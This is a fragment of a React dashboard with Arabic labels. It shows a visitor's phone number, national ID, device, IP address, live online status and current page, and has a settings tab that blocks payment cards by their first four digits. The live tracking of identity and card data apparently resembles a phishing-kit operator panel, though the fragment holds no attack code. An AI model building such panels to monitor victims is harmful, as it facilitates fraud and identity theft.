                    <span style={{ color: "#374151", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.phoneNumber}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" /></svg>
                    <span style={{ color: "#374151", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.identityNumber}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
                    <span style={{ color: "#9ca3af" }}>{liveSummary.deviceType}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0h10a2 2 0 002-2V9M9 21H5a2 2 0 01-2-2V9m0 0h18" /></svg>
                    <span style={{ color: "#9ca3af" }}>{liveSummary.os}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" /></svg>
                    <span style={{ color: "#9ca3af" }}>{liveSummary.browser}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <span style={{ fontSize: "0.95rem" }}>{getCountryFlag(selectedRequest.raw)}</span>
                    <span style={{ color: "#9ca3af" }}>{getCountryCode(selectedRequest.raw)}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v4a2 2 0 01-2 2M5 12a2 2 0 00-2 2v4a2 2 0 002 2h14a2 2 0 002-2v-4a2 2 0 00-2-2" /></svg>
                    <span style={{ color: "#9ca3af", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.ip}</span>
                  </div>
                  {/* مؤشر حالة الاتصال الحية */}
                  <div style={{ 
                    display: "flex", 
                    alignItems: "center", 
                    gap: 6, 
                    padding: "8px 12px", 
                    borderLeft: "1px solid #f3f4f6", 
                    flexShrink: 0 
                  }}>
                    {/* نقطة النبض */}
                    <div style={{
                      width: 8,
                      height: 8,
                      borderRadius: "50%",
                      backgroundColor: liveSummary.isOnline ? "#22c55e" : "#9ca3af",
                      boxShadow: liveSummary.isOnline ? "0 0 6px rgba(34, 197, 94, 0.6)" : "none",
                      animation: liveSummary.isOnline ? "connectionPulse 2s infinite" : "none",
                    }} />
                    {/* نص الحالة */}
                    <span style={{ 
                      color: liveSummary.isOnline ? "#16a34a" : "#9ca3af", 
                      fontFamily: "ui-monospace, SFMono-Regular, monospace",
                      fontSize: "0.75rem",
                      fontWeight: liveSummary.isOnline ? 700 : 400
                    }}>
                      {liveSummary.isOnline ? "متصل الآن" : liveSummary.lastSeen ? formatElapsedTime(liveSummary.lastSeen) : "غير متصل"}
                    </span>
                    {/* مؤشر البث الحي */}
                    {liveSummary.isLive && (
                      <div style={{
                        width: 6,
                        height: 6,
                        borderRadius: "50%",
                        backgroundColor: "#3b82f6",
                        animation: "liveIndicator 1.5s infinite",
                      }} />
                    )}
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", flexShrink: 0 }}>
                    <span style={{ fontSize: "10px", padding: "2px 6px", background: "#dcfce7", color: "#166534", borderRadius: 4, border: "1px solid #86efac", fontWeight: 600 }}>
                      {getPageArabicName(liveSummary.currentPage)}
                    </span>
                  </div>
                </div>
              </div>

              {/* Client Details Panel */}
              <div
                style={{
                  background: "#f8fafc",
                  border: "1px solid #e5e7eb",
                  borderRadius: 0,
                  padding: 0,
                  marginTop: 0,
                  width: "100%",
                  height: "calc(100vh - 54px - 120px)",
                  minHeight: 420,
                  overflowY: "auto",
                  overflowX: "hidden",
                  boxShadow: "inset 0 1px 0 rgba(255,255,255,0.8)",
                }}
              >
                {renderAllNewBoxes()}
              </div>
            </div>
          )}
        </main>
      </div>

      {/* Settings Modal */}
      {showSettingsModal && (
        <div 
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.5)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 1000,
            direction: "rtl",
          }}
          onClick={(e) => { if (e.target === e.currentTarget) setShowSettingsModal(false); }}
        >
          <div 
            ref={settingsModalRef}
            style={{
              background: "#fff",
              borderRadius: 16,
              width: settingsTab === "archive" ? "95vw" : 500,
              maxWidth: "95vw",
              maxHeight: "90vh",
              overflow: "hidden",
              display: "flex",
              flexDirection: "column",
              boxShadow: "0 20px 50px rgba(0,0,0,0.2)",
            }}
          >
            {/* Header */}
            <div style={{ padding: "16px 20px", borderBottom: "1px solid #e5e7eb", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h2 style={{ margin: 0, fontSize: "1.1rem", fontWeight: 700, color: "#111827" }}>الإعدادات</h2>
              <button 
                onClick={() => setShowSettingsModal(false)}
                style={{ border: "none", background: "none", cursor: "pointer", padding: 4, color: "#6b7280" }}
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <line x1="18" y1="6" x2="6" y2="18"/>
                  <line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
              </button>
            </div>

            {/* Tabs */}
            <div style={{ display: "flex", borderBottom: "1px solid #e5e7eb", background: "#f9fafb" }}>
              {[
                { key: "security", label: "الأمان" },
                { key: "cards", label: "البطاقات" },
              ].map((tab) => (
                <button
                  key={tab.key}
                  onClick={() => setSettingsTab(tab.key as any)}
                  style={{
                    flex: 1,
                    padding: "12px",
                    border: "none",
                    background: settingsTab === tab.key ? "#fff" : "transparent",
                    color: settingsTab === tab.key ? "#2563eb" : "#6b7280",
                    fontWeight: settingsTab === tab.key ? 700 : 500,
                    cursor: "pointer",
                    borderBottom: settingsTab === tab.key ? "2px solid #2563eb" : "2px solid transparent",
                    transition: "all 0.2s",
                  }}
                >
                  {tab.label}
                </button>
              ))}
            </div>

            {/* Content */}
            <div style={{ padding: 20, overflowY: "auto", flex: 1 }}>
              {/* Security Tab */}
              {settingsTab === "security" && (
                <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
                  {/* Change Password */}
                  <div style={{ background: "#f9fafb", borderRadius: 12, padding: 16 }}>
                    <h3 style={{ margin: "0 0 12px 0", fontSize: "0.95rem", fontWeight: 700, color: "#111827" }}>تغيير كلمة المرور</h3>
                    <input 
                      type="password" 
                      placeholder="كلمة المرور الجديدة"
                      style={{ width: "100%", padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.9rem", marginBottom: 8 }}
                    />
                    <input 
                      type="password" 
                      placeholder="تأكيد كلمة المرور"
                      style={{ width: "100%", padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.9rem", marginBottom: 8 }}
                    />
                    <button style={{ padding: "10px 20px", background: "#2563eb", color: "#fff", border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600 }}>
                      تحديث كلمة المرور
                    </button>
                  </div>

                  {/* Logout All Devices */}
                  <div style={{ background: "#fef2f2", borderRadius: 12, padding: 16, border: "1px solid #fecaca" }}>
                    <h3 style={{ margin: "0 0 12px 0", fontSize: "0.95rem", fontWeight: 700, color: "#991b1b" }}>تسجيل خروج جميع الأجهزة</h3>
                    <p style={{ margin: "0 0 12px 0", fontSize: "0.85rem", color: "#6b7280" }}>سيتم تسجيل خروجك من جميع الأجهزة المتصلة</p>
                    <button style={{ padding: "10px 20px", background: "#dc2626", color: "#fff", border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600 }}>
                      تسجيل خروج جميع الأجهزة
                    </button>
                  </div>

                  {/* Change Email */}
                  <div style={{ background: "#f9fafb", borderRadius: 12, padding: 16 }}>
                    <h3 style={{ margin: "0 0 12px 0", fontSize: "0.95rem", fontWeight: 700, color: "#111827" }}>تغيير البريد الإلكتروني</h3>
                    <input 
                      type="email" 
                      placeholder="البريد الإلكتروني الجديد"
                      style={{ width: "100%", padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.9rem", marginBottom: 8 }}
                    />
                    <button style={{ padding: "10px 20px", background: "#2563eb", color: "#fff", border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600 }}>
                      تحديث البريد الإلكتروني
                    </button>
                  </div>
                </div>
              )}

              {/* Cards Tab */}
              {settingsTab === "cards" && (
                <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
                  <div style={{ background: "#f9fafb", borderRadius: 12, padding: 16 }}>
                    <h3 style={{ margin: "0 0 12px 0", fontSize: "0.95rem", fontWeight: 700, color: "#111827" }}>حظر البطاقات</h3>
                    <p style={{ margin: "0 0 12px 0", fontSize: "0.85rem", color: "#6b7280" }}>أدخل أول 4 أرقام من البطاقة لحظرها</p>
                    <div style={{ display: "flex", gap: 8 }}>
                      <input 
                        type="text"
                        maxLength={4}
                        placeholder="0000"
                        value={newBlockedCard}
                        onChange={(e) => setNewBlockedCard(e.target.value.replace(/\D/g, ""))}
                        style={{ flex: 1, padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "1rem", textAlign: "center", fontFamily: "monospace" }}
                      />
                      <button 
                        onClick={() => {
                          if (newBlockedCard.length === 4 && !blockedCards.includes(newBlockedCard)) {
                            const updated = [...blockedCards, newBlockedCard];
                            setBlockedCards(updated);
                            localStorage.setItem("blockedCards", JSON.stringify(updated));
                            setNewBlockedCard("");
                            showNotification("success", "تم حظر البطاقة بنجاح");
                          }
                        }}
                        disabled={newBlockedCard.length !== 4}
                        style={{ padding: "10px 20px", background: newBlockedCard.length === 4 ? "#dc2626" : "#d1d5db", color: "#fff", border: "none", borderRadius: 8, cursor: newBlockedCard.length === 4 ? "pointer" : "not-allowed", fontWeight: 600 }}
                      >
                        حجب
                      </button>
                    </div>
                  </div>

                  {/* Blocked Cards List */}
                  {blockedCards.length > 0 && (
                    <div style={{ background: "#fef2f2", borderRadius: 12, padding: 16, border: "1px solid #fecaca" }}>
                      <h3 style={{ margin: "0 0 12px 0", fontSize: "0.95rem", fontWeight: 700, color: "#991b1b" }}>البطاقات المحجوبة ({blockedCards.length})</h3>
                      <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
                        {blockedCards.map((card) => (
                          <div key={card} style={{ display: "flex", alignItems: "center", gap: 8, background: "#fff", padding: "8px 12px", borderRadius: 8, border: "1px solid #fecaca" }}>
                            <span style={{ fontFamily: "monospace", fontWeight: 700, color: "#dc2626" }}>{card}</span>
                            <button 
                              onClick={() => {
                                const updated = blockedCards.filter(c => c !== card);
                                setBlockedCards(updated);
                                localStorage.setItem("blockedCards", JSON.stringify(updated));
                              }}
                              style={{ border: "none", background: "#fee2e2", color: "#dc2626", cursor: "pointer", padding: "2px 6px", borderRadius: 4, fontSize: "0.75rem" }}
                            >
                              إلغاء
                            </button>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
